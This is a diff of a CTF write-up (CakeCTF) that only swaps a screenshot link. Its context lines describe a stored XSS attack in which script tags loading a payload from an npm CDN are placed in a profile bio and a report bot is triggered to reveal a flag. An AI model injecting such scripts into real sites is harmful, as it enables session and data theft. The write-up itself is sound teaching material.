@@ -114,7 +114,7 @@ xhr.send();
 ```
 I have `<script src='my-npm-payload-url'></script>` in my bio's content so that when I go to my profile and click "Report", the payload will not be lost. Now I change my bio: `<script src="https://cdn.jsdelivr.net/npm/my-npm-payload@3.0.0"></script>` and after reporting, I get the result:
 
-![image](https://user-images.githubusercontent.com/103978452/188373761-51e8babe-9dbb-4479-bbe8-7686cd21cfd2.png)
+![image](https://user-images.githubusercontent.com/103978452/188389577-b98d3bab-212d-4eab-825b-4df19d174330.png)
 
 Now visit `/profile/7cokbb5m2bo` and here's the flag:
 'CakeCTF{httponly=true_d03s_n0t_pr0t3ct_U_1n_m4ny_c4s3s!}'
